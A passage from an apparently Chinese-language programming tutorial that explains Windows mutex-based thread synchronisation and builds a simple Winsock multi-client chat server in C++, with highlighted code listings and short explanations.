class="literal">NULL</span>, <span class="number">0</span>, threadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//偶数次执行-=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadDes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, tHandles, TRUE, INFINITE);<span class="comment">//启动多个内核对象等待信号</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result: %lld\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相较于之前改动不大，关键在于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//相当于上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//用完解锁</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个线程在运行的时候，他要等待其中一个线程先<code>ReleaseMutex</code>。其中谁先开始仍然是随机的。</p><img src="/2022/07/18/thread/012.png" class=""><p>可以看到这次得到理想的值了。</p><blockquote><p>这个互斥对象的意义就是在线程运行的时候，让他处于等待通知状态，执行完毕之后在释放所有权，这样可以避免多个线程快速对内存的操作的影响</p></blockquote><hr><h2 id="socket-互斥线程同步"><a href="#socket-互斥线程同步" class="headerlink" title="socket+互斥线程同步"></a>socket+互斥线程同步</h2><p>简单就是聊天服务器和客户端的low low版本</p><img src="/2022/07/18/thread/013.png" class=""><ol><li>socket bind listen accept必不可少</li><li>c&#x2F;s的模式</li><li>上线的客户端，通过服务器新起一个线程维护管理</li><li>收到的消息如何发送给客户端</li><li>当客户端下线后，需要断开这个线程的连接</li></ol><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>前面的代码其实都差不多，直接copy以前的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个互斥对象</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);<span class="comment">//不被子进程继承 不获取所有权 互斥对象没有名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start listen!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addrCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//来自客户端的连接</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addrCli, &amp;len);</span><br><span class="line"><span class="comment">//启用线程处理客户端</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"></span><br><span class="line">hThread = (HWND)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, HandleCln, (<span class="type">void</span> *)&amp;sockConn, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Connect Num = %d, client ip: %s\n&quot;</span>,clntCnt, <span class="built_in">inet_ntoa</span>(addrCli.sin_addr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>循环接收消息上处理会有不同，毕竟要处理多个客户端，还有队列中下线某台，后面的移上来。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线程和网络编程和队列都有了，线程同步的问题还没解决，就是给他上锁。<br>上锁的核心就是线程对全局变量的处理太快，产生偏差值的问题，所以我们在循环处理中对全局变量做改变的前后加上锁。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>完整的服务端</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CLNT 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">SOCKET clnSocks[MAX_CLNT];<span class="comment">//所有连接的客户端的socket</span></span><br><span class="line"><span class="type">int</span> clntCnt = <span class="number">0</span>;<span class="comment">//客户端连接的个数</span></span><br><span class="line"></span><br><span class="line">HANDLE hMutex;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转发消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span> *szMsg, <span class="type">int</span> iLen)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="built_in">send</span>(clnSocks[i], szMsg, iLen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理消息的线程</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">HandleCln</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET*)arg);</span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">//收到的消息转发给客户端</span></span><br><span class="line"><span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时连接数：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="comment">//客户端下线过程 12345 其中一台下线后面的补上</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clntCnt; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (hClntSock == clnSocks[i])&#123;</span><br><span class="line"><span class="comment">//确认某台客户端下线，可以移除掉</span></span><br><span class="line"><span class="keyword">while</span> (i++ &lt; clntCnt)&#123;</span><br><span class="line">clnSocks[i] = clnSocks[i + <span class="number">1</span>];<span class="comment">//某台下线后，就把后面的移上来</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//移除结束</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移除之后总数-1</span></span><br><span class="line">clntCnt--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;断开后，此时连接数为：%d\n&quot;</span>, clntCnt);</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个互斥对象</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);<span class="comment">//不被子进程继承 不获取所有权 互斥对象没有名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span 